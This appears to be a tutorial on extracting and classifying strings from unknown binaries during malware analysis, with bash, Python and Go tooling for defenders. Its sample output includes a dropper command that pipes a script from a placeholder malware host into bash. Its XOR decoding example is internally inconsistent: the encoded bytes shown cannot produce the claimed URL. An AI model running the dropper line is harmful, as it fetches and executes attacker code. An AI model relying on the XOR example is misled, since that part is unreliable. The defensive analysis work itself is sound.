Strings Analysis

Extract, decode, and analyze strings from unknown binaries to reveal hardcoded data, network indicators, and compile artifacts.

Overview

Strings are the fastest path from an unknown binary to a working hypothesis about what it does. Compilers, libraries, and malware authors leave readable bytes throughout an executable, and the strings command surfaces them. This article covers encoding selection, pattern-based extraction, obfuscation countermeasures, and family fingerprinting, so you can turn a raw dump into actionable indicators without running the sample.

Required Reading

  • Binary Identification - identify the binary type and detect packing before strings extraction

You Have an Unknown Binary

You ran file and sha256sum . You computed the entropy. You know it is an ELF executable, not packed. Now you need to understand what it does without executing it. The fastest path to understanding is the strings inside it.

Strings are sequences of printable characters embedded in the binary. Compilers leave behind symbols, version strings, file paths. Developers hardcode IP s, URL s, error messages. Malware authors embed C2 domains, encryption keys, and antidebug strings. The strings command surfaces all of this.

The strings Command

strings scans a file for sequences of printable ASCII (and optionally Unicode) characters at least N bytes long: 

$ strings unknown.bin

Default minimum is 4 characters. For malware analysis, increase to 6 to cut noise:

$ strings -n 6 unknown.bin

Encoding Selection

The most important flag is -e (encoding). Malware compiled for Windows uses UTF-16LE internally (Windows NT kernel uses wide chars). If you run strings without -e , you miss every Windows string.

Flag Encoding When to Use
-e s 7-bit ASCII Unix/Linux binaries, default
-e S 8-bit ASCII Extended ASCII, Latin-1
-e b 16-bit big-endian Legacy big-endian systems
-e l 16-bit little-endian (UTF-16LE) Windows binaries
-e B 32-bit big-endian UCS-4 big-endian
-e L 32-bit little-endian UCS-4 little-endian

For an unknown binary, sweep all encodings:

#!/bin/bash
# strings_sweep.sh -- extract strings in all encodings
TARGET="$1"
OUTDIR="${TARGET}.strings"
mkdir -p "$OUTDIR"

for enc in s S b l B L; do
    name=$([[ "$enc" == "s" ]] && echo "ascii-7" ||
           [[ "$enc" == "S" ]] && echo "ascii-8" ||
           [[ "$enc" == "b" ]] && echo "utf16-be" ||
           [[ "$enc" == "l" ]] && echo "utf16-le" ||
           [[ "$enc" == "B" ]] && echo "utf32-be" ||
           echo "utf32-le")
    strings -n 6 -e "$enc" "$TARGET" > "$OUTDIR/$name.txt"
    count=$(wc -l < "$OUTDIR/$name.txt")
    echo "[*] $name ($enc): $count strings"
done

Output for a Windows trojan:

[*] ascii-7 (s): 847 strings
[*] ascii-8 (S): 849 strings
[*] utf16-be (b): 23 strings
[*] utf16-le (l): 3241 strings    <-- this is the one
[*] utf32-be (B): 0 strings
[*] utf32-le (L): 0 strings

The encoding with the most strings is the binary's native encoding. For Linux ELF binaries, ASCII dominates. For Windows PEs, UTF-16LE typically has the most informative strings (though ASCII will also have some, from statically linked libraries).

Useful strings Flags

Flag Purpose
-n N Minimum string length (default 4, use 6+ for malware)
-e X Encoding (see table above)
-f Print the file name before each string
-t x Print offset in hex before each string
-t d Print offset in decimal
-t o Print offset in octal
-a Scan the whole file, not just the data section
-w Treat whitespace as valid string characters

Printing offsets is critical for cross-referencing with a disassembler:

$ strings -t x -n 6 unknown.bin | head -20
    28b4 /lib64/ld-linux-x86-64.so.2
    29e0 __gmon_start__
    2a10 libc.so.6
    2a1c puts
    2a24 __libc_start_main
    2f80 /etc/passwd
    3010 192.168.1.100

Offset 0x3010 contains the string 192.168.1.100 . In a disassembler, you find the code that references address 0x3010 - that is the code that uses this IP . Offsets connect static strings to code paths.

What Strings Reveal

Strings fall into categories. Each category tells a different part of the story.

Compiler and Build Environment

These strings reveal how the binary was built. They are mostly noise for functionality analysis but critical for attribution: 

$ strings unknown.bin | grep -iE 'gcc|clang|gnu|glibc'
GCC: (GNU) 13.2.1 20230801
GNU C17 (GCC) version 13.2.1 20230801 (x86_64-pc-linux-gnu)
GLIBC_2.2.5
GLIBC_2.14

The GCC version string tells you the compiler, version, and sometimes the distro. GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) identifies Ubuntu 22.04 as the build host. GLIBC_2.34 means the binary needs at least glibc 2.34 to run. 

$ strings unknown.bin | grep -iE 'rust|cargo|rustc'
/home/user/.cargo/registry/src/
main.rs

Rust binaries leave main.rs paths and panic messages. Go binaries embed the Go version and build paths: 

$ strings unknown.bin | grep -E '^go[0-9]'
go1.22.3

Network Indicators

Hardcoded IP addresses, hostnames, and URL s are the most actionable intelligence in strings analysis. They become firewall block rules, DNS sinkholes, and threat intel IoCs. 

$ strings -n 6 unknown.bin | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u
10.0.2.15
185.234.72.18
192.168.1.1

IP addresses embedded in binaries follow patterns: - 10.x.x.x , 192.168.x.x : Internal IP s - likely the malware author's test environment, accidentally compiled in. - 127.0.0.1 : Localhost listeners, usually for inter-process communication on the victim. - Public IP s: C2 servers, exfiltration targets, or fallback infrastructure. 

$ strings -n 6 unknown.bin | grep -Eo 'https?://[^ ]+' | sort -u
http://bad.c2-server.xyz/panel/gate.php
https://update-server.com/v2/checkin

URL s reveal the protocol ( HTTP / HTTPS ), path structure, and sometimes parameter names

  • these inform the C2 protocol understanding.

$ strings -n 6 unknown.bin | grep -Eio '[a-z0-9.-]+\.(com|net|org|xyz|top|tk|ml|ga|cf|pw|ru|cn|su|io)'
evil-domain.xyz
backup-panel.top

Threat actors use cheap TLDs ( .xyz , .top , .tk ) for disposable C2 infrastructure. A domain on .xyz with a random-looking name is highly suspicious.

File System Paths

File paths reveal what the binary reads, writes, or modifies:

$ strings -n 6 unknown.bin | grep -E '^/(home|tmp|etc|var|root|usr|dev)/'
/etc/ssh/sshd_config
/tmp/.cache_3429
/home/*/.bashrc
/var/log/wtmp
/dev/null
						
/etc/ssh/sshd_config

SSH configuration access - credential theft or persistence via authorized_keys. 

/tmp/.cache_3429

Hidden file in /tmp/ - likely a lock file, data cache, or dropper staging area. 

/home/*/.bashrc

Glob pattern targeting all users - .bashrc modification for persistence (appending a command to launch the malware on every shell).

Registry Keys (Windows)

For Windows malware analyzed from Linux:

$ strings -n 6 -e l unknown.exe | grep -iE '\\\\registry\\\\|HKEY_|Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\'
Software\Microsoft\Windows\CurrentVersion\Run
SYSTEM\CurrentControlSet\Services

CurrentVersion\Run is the classic Windows persistence mechanism. Any binary writing there survives reboot.

Function Names

Exported and imported function names map directly to capabilities:

$ strings -n 6 unknown.bin | grep -E '^(socket|connect|send|recv|bind|listen|accept)$'
socket
connect
send
recv

Network communication. The binary opens sockets.

$ strings -n 6 unknown.bin | grep -E '^(fopen|fwrite|fread|fclose|open|write|read|close|unlink|rename)$'
fopen
fwrite
unlink
rename

File operations. It reads, writes, deletes, and renames files.

$ strings -n 6 unknown.bin | grep -E '^(system|popen|exec|fork)$'
system
popen

Command execution. It spawns shells.

$ strings -n 6 unknown.bin | grep -E '^(crypt|encrypt|decrypt|AES|RC4|XOR|base64|sha256|md5)$'

Cryptographic operations. It encrypts or hashes data.

Error and Debug Messages

Error strings are gold. They contain human-readable descriptions of exactly what the binary is trying to do: 

Failed to connect to server
File not found: %s
Encryption key too short
Process injection failed: error code %d
Cannot open registry key: %s

Encryption key too short tells you three things: there is an encryption key, it has a minimum length, and the binary checks it. Process injection failed confirms injection behavior without ever running the binary.

Printf Format Strings

Format strings expose variable types and program logic:

%s:%d: user %s authenticated
Sending %d bytes to %s:%d

The format specifiers tell you the data types involved. Sending %d bytes to %s:%d means the binary sends a variable number of bytes to a host:port pair.

Shell Commands

Embedded shell commands indicate what the malware runs on compromised hosts:

$ strings -n 6 unknown.bin | grep -E '(bash|sh |/bin/sh|/bin/bash).*'
/bin/bash -c
sh -c curl http://malware.site/dropper.sh | bash

The second line downloads and executes a script - a dropper payload. This gives you the exact kill chain.

Data Patterns

Encoded data blobs appear as random-looking strings. Base64 ends with = padding: 

$ strings -n 40 unknown.bin | grep -E '^[A-Za-z0-9+/]{20,}={0,2}$'
cGFzc3dvcmQxMjM0NTY3OA==
dXNlcm5hbWU9YWRtaW4mcGFzc3dvcmQ9c2VjcmV0

Decode them:

$ echo 'cGFzc3dvcmQxMjM0NTY3OA==' | base64 -d
password12345678

Hex-encoded strings:

$ strings -n 10 unknown.bin | grep -xE '[0-9A-Fa-f]{20,}'
DEADBEEFCAFE1234BAADF00D
6a09e667bb67ae853c6ef372a54ff53a

SHA-256 initialization constants (top of SHA-256 algorithm) appear as hex in code. The constants 6a09e667 , bb67ae85 , 3c6ef372 , a54ff53a are the first four SHA-256 IV values - the binary implements SHA-256.

String Pattern Detection Script

Combine strings with regex post-processing: 

#!/usr/bin/env python3
"""
strings_analyze.py -- extract and categorize strings from a binary
Usage: python3 strings_analyze.py <binary>
"""
import re
import subprocess
import sys


def run_strings(filepath):
    patterns = {
        'ipv4': r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b',
        'url': r'https?://[^\s<>"{}|\\^`\[\]]+',
        'domain': r'\b[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.(?:com|net|org|io|xyz|top|tk|ml|ga|cf|pw|ru|cn|su|info|biz|cc|me|co|so|in|us|eu|de|fr|uk|it|es|nl|se|no|dk|fi|ch|at|be|pl|cz|sk|hu|ro|bg|lt|lv|ee|hr|si|gr|pt|ie|is)\b',
        'path': r'(?:/[a-zA-Z0-9._\[\]-]+)+/?',
        'registry': r'(?i)(HKEY_LOCAL_MACHINE|HKEY_CURRENT_USER|HKLM|HKCU|Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\[^\\s]+)',
        'base64': r'[A-Za-z0-9+/]{20,}={0,2}',
        'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
        'function': r'\b(socket|connect|send|recv|bind|listen|accept|fopen|fwrite|fread|fclose|open|write|read|close|unlink|rename|system|popen|exec[lv]p?e?|fork|clone|ptrace|crypt|encrypt|decrypt|AES|RC4|XOR|base64|sha256|md5|CreateFile|WriteFile|RegCreateKey|RegSetValue|VirtualAlloc|VirtualProtect|CreateProcess|CreateRemoteThread|WriteProcessMemory|GetProcAddress|LoadLibrary|CryptEncrypt|CryptDecrypt)\b',
    }

    results = {}
    for encoding_label, enc_flag in [
        ('ascii', '-es'),
        ('utf16le', '-el'),
        ('utf16be', '-eb'),
    ]:
        try:
            out = subprocess.run(
                ['strings', '-n', '6', enc_flag, filepath],
                capture_output=True, text=True, timeout=30
            )
            strings_list = out.stdout.splitlines()
            results[encoding_label] = {
                'count': len(strings_list),
                'matches': {},
            }
            for category, pattern in patterns.items():
                matches = list(set(
                    m.group(0) for s in strings_list
                    for m in re.finditer(pattern, s, re.IGNORECASE)
                ))
                if matches:
                    results[encoding_label]['matches'][category] = sorted(matches)[:50]
        except Exception as e:
            results[encoding_label] = {'count': 0, 'error': str(e)}

    return results


def print_results(results):
    for encoding, data in results.items():
        print(f"\n{'=' * 60}")
        print(f"  ENCODING: {encoding}  ({data.get('count', 0)} strings)")
        print(f"{'=' * 60}")
        if 'error' in data:
            print(f"  ERROR: {data['error']}")
            continue
        for category, matches in data.get('matches', {}).items():
            print(f"\n  --- {category.upper()} ({len(matches)} matches) ---")
            for m in matches[:20]:
                print(f"    {m}")


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <binary>")
        sys.exit(1)
    print_results(run_strings(sys.argv[1]))

Obfuscated Strings

Malware authors know about strings . They hide strings to evade static analysis. The three most common techniques:

Stack Strings

Stack strings are constructed character-by-character at runtime on the stack:

// Instead of: char *url = "http://evil.xyz/c2.php";
// Malware writes:
char url[24];
url[0] = 'h'; url[1] = 't'; url[2] = 't'; url[3] = 'p';
url[4] = ':'; url[5] = '/'; url[6] = '/'; url[7] = 'e';
// ... etc

strings sees nothing - the bytes are embedded as immediate values in MOV instructions. The string never exists as a contiguous sequence in the binary.

Floss (FireEye Labs Obfuscated String Solver) decodes these automatically:

$ pacman -S floss  # or: pip install floss
$ floss unknown.exe

Floss uses static taint analysis: it traces data flows from immediate values to function calls (like WriteFile , connect , InternetOpenUrl ). When an immediate value flows into a string-accepting function, floss reconstructs the string.

XOR-Encoded Strings

XOR encoding is the simplest obfuscation. Each byte of the string is XORed with a single key byte: 

def xor_decode(encoded: bytes, key: int) -> str:
    return bytes(b ^ key for b in encoded).decode('utf-8', errors='replace')

# In the binary, the encoded buffer is:
# "\x97\x93\x93\x9e\x9d\xff\x8a\x96\x98\x96\xf2\x9f\xa2\xb5\xbb"
# XOR each byte with 0xFF:
encoded = bytes.fromhex('9793939e9dff8a969896f29fa2b5bb')
print(xor_decode(encoded, 0xFF))
# Output: http://evil.xyz/c2.php

The key is often a single byte like 0xFF , 0xAA , or 0x13 . Finding the key requires brute force or pattern recognition. If you suspect XOR encoding, search for the likely key: 

#!/usr/bin/env python3
"""
xor_strings.py -- brute-force XOR decode of suspicious byte sequences
"""
import sys

def try_xor_decode(data: bytes, key: int) -> str:
    decoded = bytes(b ^ key for b in data)
    try:
        return decoded.decode('ascii')
    except UnicodeDecodeError:
        return None

def find_xor_strings(filepath: str, min_len: int = 6):
    with open(filepath, 'rb') as f:
        data = f.read()

    # Scan for patterns that decode to printable ASCII
    found = []
    for i in range(len(data) - min_len):
        for key in range(256):
            chunk = data[i:i+64]
            decoded = bytes(b ^ key for b in chunk)
            printable = True
            str_len = 0
            for byte in decoded:
                if 32 <= byte <= 126:
                    str_len += 1
                elif byte == 0 and str_len >= min_len:
                    break
                else:
                    printable = False
                    break
            if printable and str_len >= min_len:
                result = decoded[:str_len].decode('ascii')
                if result.isprintable() and len(result) >= min_len:
                    found.append((hex(i), hex(key), result))
    return found

if __name__ == '__main__':
    results = find_xor_strings(sys.argv[1])
    for offset, key, string in results:
        print(f"  offset={offset}  key={key}  ->  {string}")

Encrypted Config Blobs

Some malware stores an encrypted blob ( AES , RC4) as a resource or at the end of the binary. The decryption key is in the code (or derived from system data). strings shows only the encrypted blob - random-looking bytes.

Detection: look for large, high-entropy data sections in an otherwise normal entropy profile. If the binary has a .rodata section and a spike of entropy at the end, that is the encrypted config. 

$ binwalk -E unknown.bin --save
# Examine the entropy plot for late-file entropy spikes

Floss String Solver

Floss integrates with I DA and Ghidra but also works standalone: 

$ floss --no-static-strings unknown.bin

Output categories:

0x4010a0: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
0x401100: "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

-- FLOSS DECODED STRINGS --

Floss automatically identifies and decodes: - Stack strings : Constructed via MOV instructions.

  • Tight strings : Encoded in small functions that decode them in a loop.
  • Decoded strings : XOR, ROL, and other simple encodings, identified via function analysis.

For packed binaries, floss can analyze unpacked memory dumps:

$ floss -f memdump.bin

Building a String-Based Classifier

#!/usr/bin/env python3
"""
malware_classifier.py -- classify malware by string fingerprints
"""
import subprocess
import sys

FAMILY_SIGNATURES = {
    'Mirai': ['MIRAI', 'busybox', 'CNC', 'selfrep'],
    'Gafgyt': ['gafgyt', 'LOLNOGTFO'],
    'Tsunami/Kaiten': ['kaiten.c', 'NICK', 'PRIVMSG'],
    'XorDDoS': ['xorddos'],
    'WannaCry': ['WannaCryptor', 'wcry', 'tasksche', 'Microsoft Security'],
    'Petya': ['Mischa', 'petya', 'Readme.html'],
    'njRAT': ['njRAT', 'njq8'],
    'AgentTesla': ['AgentTesla'],
    'DarkComet': ['DarkComet', '#KCMDDC'],
}

def classify(filepath):
    out = subprocess.run(
        ['strings', '-n', '6', filepath],
        capture_output=True, text=True, timeout=30
    )
    strings = out.stdout.lower()
    matches = {}
    for family, sigs in FAMILY_SIGNATURES.items():
        score = sum(1 for s in sigs if s.lower() in strings)
        if score > 0:
            matches[family] = score
    return sorted(matches.items(), key=lambda x: x[1], reverse=True)

if __name__ == '__main__':
    results = classify(sys.argv[1])
    if results:
        for family, score in results:
            print(f"  [{score}] {family}")
    else:
        print("  No family signature matched")

Manual Inspection of Full Strings Output

The most productive analysis technique is reading the entire strings output from top to bottom. It takes minutes and reveals patterns that regex misses: 

$ strings -n 6 binary.bin | less

Scroll through. Look for:

  • Nearby strings that form a sentence : These are error messages. Read them.
  • Repeated strings : Mutex names, registry keys, file paths - the binary references them from multiple code paths.
  • Long random-looking strings : Keys, IVs, config data. Buffer dumps.
  • What is NOT there : Stripped binaries lack function names. Packed binaries lack everything. Missing strings are as informative as present ones.

Key principle: every string was put there intentionally by a developer . No bytes ended up in the binary by accident (except compiler padding). If a string says backdoor_password , someone wrote that in source code.

Challenge

Write a Go tool that reads a binary, extracts printable character runs, and classifies them into network indicators, web addresses, and domain names. Run it on a known sample and compare the output with strings piped through grep . 

package main

import (
	"fmt"
	"os"
	"regexp"
)

var (
	reIP     = regexp.MustCompile(`\b(?:\d{1,3}\.){3}\d{1,3}\b`)
	reURL    = regexp.MustCompile(`https?://[^\s"'<>]+`)
	reDomain = regexp.MustCompile(`\b[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.(com|net|org|io|xyz|top|ru|cn)\b`)
)

func extractPrintable(data []byte, minimum int) []string {
	results := make([]string, 0)
	current := make([]byte, 0)

	flush := func() {
		if len(current) >= minimum {
			results = append(results, string(current))
		}
		current = current[:0]
	}

	for _, b := range data {
		if b >= 0x20 && b <= 0x7e {
			current = append(current, b)
		} else {
			flush()
		}
	}
	flush()

	return results
}

func main() {
	if len(os.Args) != 2 {
		fmt.Fprintf(os.Stderr, "usage: %s <binary>\n", os.Args[0])
		os.Exit(1)
	}

	data, err := os.ReadFile(os.Args[1])
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	seen := make(map[string]bool)
	for _, line := range extractPrintable(data, 6) {
		for _, match := range reIP.FindAllString(line, -1) {
			if !seen["ip:"+match] {
				seen["ip:"+match] = true
				fmt.Printf("[ip]     %s\n", match)
			}
		}
		for _, match := range reURL.FindAllString(line, -1) {
			if !seen["url:"+match] {
				seen["url:"+match] = true
				fmt.Printf("[url]    %s\n", match)
			}
		}
		for _, match := range reDomain.FindAllString(line, -1) {
			if !seen["domain:"+match] {
				seen["domain:"+match] = true
				fmt.Printf("[domain] %s\n", match)
			}
		}
	}
}
